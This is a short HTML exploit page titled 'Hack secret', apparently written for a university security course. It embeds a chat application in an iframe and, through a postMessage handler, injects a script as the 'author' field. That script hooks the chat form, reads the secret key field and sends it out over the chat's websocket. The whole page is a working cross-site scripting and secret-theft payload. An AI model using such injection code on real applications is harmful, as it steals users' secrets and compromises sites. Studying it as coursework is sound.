<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Hack secret</title>
</head>
<body>
<h1>Chat room is below</h1>
<iframe src="http://guldendraak.ccs.neu.edu:8081/chat" height="800px" width="800px">
</iframe>
<script>
    var onMessage = function(msg) {
        if (msg.origin !== 'http://guldendraak.ccs.neu.edu:8081') {
            console.log('E: received message from invalid origin ' + msg.origin);
            return;
        }
        var inject='<script>$(\'#form-input\').submit(function(e){'
    		+'var secret = $(\'#key\').val();'
    	    +'var author = \'husky\';'
    	    +'ws.send(JSON.stringify({author: author, text: secret}));'
    	+'});<\/script>';
    	
        if (msg.data.command === 'ready') {
            console.log('R: ready');
            msg.source.postMessage({command: 'ready', author: inject}, 'http://guldendraak.ccs.neu.edu:8081');
        } else {
            console.log('E: unknown command ' + msg.data.command);
        }
    };

    addEventListener('message', onMessage, false);
</script>
</body>
</html>